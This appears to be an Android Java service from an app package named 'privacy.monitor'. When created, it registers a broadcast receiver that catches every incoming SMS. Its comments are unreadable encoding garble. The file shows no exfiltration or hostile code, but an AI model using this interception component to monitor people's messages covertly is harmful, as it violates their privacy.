package com.privacy.monitor.service;

import com.privacy.monitor.receiver.MmsReceiver;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

/**
 * �������ط���
 */
public class SmsReceiverService extends Service {

	
	@Override
	public void onCreate() {
		super.onCreate();
		//���봴�����Ź㲥����
		IntentFilter filter = new IntentFilter();
		filter.addAction("android.provider.Telephony.SMS_RECEIVED");
		MmsReceiver receiver = new MmsReceiver();
		registerReceiver(receiver, filter);
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		
		return null;
	}

}
